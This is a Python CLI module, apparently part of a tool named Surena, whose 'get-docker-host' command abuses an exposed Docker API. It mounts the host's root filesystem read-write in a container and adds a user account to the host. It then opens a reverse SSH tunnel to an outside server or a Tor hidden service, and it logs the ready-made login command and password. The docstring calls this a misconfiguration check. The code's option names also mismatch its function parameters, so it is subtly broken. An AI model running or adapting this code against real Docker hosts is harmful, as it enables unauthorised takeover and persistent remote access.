import logging

import click
from pkg_resources import resource_filename

from surena.cli.options import Port, required_if_option_has_specific_value
from surena.models.commons import countdown
from surena.models.docker_client import DockerHost, SpyContainer
from surena.models.ssh import SSHServer

logging.basicConfig(level=logging.INFO)


SECONDS_OF_LIVE = 300


logger = logging.getLogger()


@click.command("get-docker-host")
@click.option(
    "--docker-host-address",
    required=True,
    show_default=True,
    help="The Docker host address.",
)
@click.option(
    "--docker-host-port",
    required=True,
    type=Port(),
    show_default=True,
    help="The Docker host port.",
)
@click.option(
    "--access-method",
    required=True,
    type=click.Choice(["tor", "reverse-ssh"]),
    show_default=True,
    help="Select the method for accessing to Docker host machine.",
)
@click.option(
    "--ssh-server-address",
    cls=required_if_option_has_specific_value("access_type", "reverse-ssh"),
    show_default=True,
    help=(
        "When selecting reverse SSH as the access method, you should specify a server"
        " with SSH service for establishing the reverse SSH connection."
    ),
)
@click.option(
    "--ssh-server-username",
    cls=required_if_option_has_specific_value("access_type", "reverse-ssh"),
    show_default=True,
    help="The username of remote SSH server.",
)
@click.option(
    "--ssh-server-password",
    cls=required_if_option_has_specific_value("access_type", "reverse-ssh"),
    show_default=True,
    help="The password of remote SSH server.",
)
@click.option(
    "--ssh-server-port",
    type=Port(),
    cls=required_if_option_has_specific_value("access_type", "reverse-ssh"),
    default=22,
    show_default=True,
    help="The SSH port of remote SSH server.",
)
def get_docker_host(
    target_address: str,
    target_port: int,
    connection_method: str,
    ssh_server_name: str,
    ssh_server_username: str,
    ssh_server_password: str,
    ssh_server_ssh_port: int,
) -> None:
    """
    The "get-docker-host" command can show you if your Docker host has
    vulnerabilities due to misconfiguration.
    """
    docker_client = DockerHost(target_address, target_port)

    print(
        'Docker host operation system is "{}".'.format(
            docker_client.get_docker_host_operation_system_type()
        )
    )

    ubuntu_dockerfile_path = resource_filename(
        "surena.models.docker",
        "ubuntu.Dockerfile",
    )
    image_name = docker_client.get_image_unique_name()

    image = docker_client.build_image(ubuntu_dockerfile_path, image_name)

    container = docker_client.run_container(
        image,
        command="/bin/sh",
        detach=True,
        remove=True,
        volumes={"/": {"bind": "/data", "mode": "rw"}},
        network="host",
        tty=True,
    )

    spy_container = SpyContainer(container)
    username = spy_container.generate_docker_host_unique_username()
    password = SpyContainer.generate_random_word()
    spy_container.add_username_to_docker_host(username, password)

    docker_host_free_port = spy_container.get_free_port_on_docker_host()
    # spy_container.add_port_to_service_ssh()

    if connection_method == "tor":
        tor_port = spy_container.get_free_port_on_docker_host()
        spy_container.config_service_tor(docker_host_free_port, tor_port)
        spy_container.start_service_tor()
        # spy_container.wait_until_conect_to_tor_network(docker_host_free_port, tor_port)
        tor_hostname = spy_container.get_tor_hostname().strip()
        logger.info(
            'Run command "torsocks ssh {}@{} -p {}" to connect to target host with'
            " password {}".format(
                username, tor_hostname, docker_host_free_port, password
            )
        )
    else:
        ssh_client = SSHServer(
            ssh_server_name,
            ssh_server_ssh_port,
            ssh_server_username,
            ssh_server_password,
        )
        ssh_client.config_ssh_server()
        free_port_on_server = ssh_client.get_free_port()

        spy_container.reverse_ssh_from_docker_host_to_remote_server(
            ssh_server_name,
            ssh_server_ssh_port,
            ssh_server_username,
            ssh_server_password,
            free_port_on_server,
        )
        logger.info(
            'You can connect to docker host with ssh service "ssh -o '
            "'StrictHostKeyChecking no' {}@{} -p {}\" with password "
            "{} ".format(username, ssh_server_name, free_port_on_server, password)
        )

    try:
        countdown(SECONDS_OF_LIVE)
    finally:
        spy_container.delete_username_from_docker_host(username)
        try:
            docker_client.remove_container(spy_container)
            logger.info('Surena removed Image "spy container" from Docker Host.')
        except ValueError:
            logger.error("Surena could not remove container from Docker Host.")

        try: 
            docker_client.remove_image(image)
            logger.info(
                'Surena removed Image "{}" from Docker Host.'.format(image_name)
            )
        except:
            logger.error(
                'Surena could not remove Image "{}" from Docker Host.'.format(
                    image_name
                )
            )
        # docker_client.destroy_containers()
        # docker_client.destroy_images()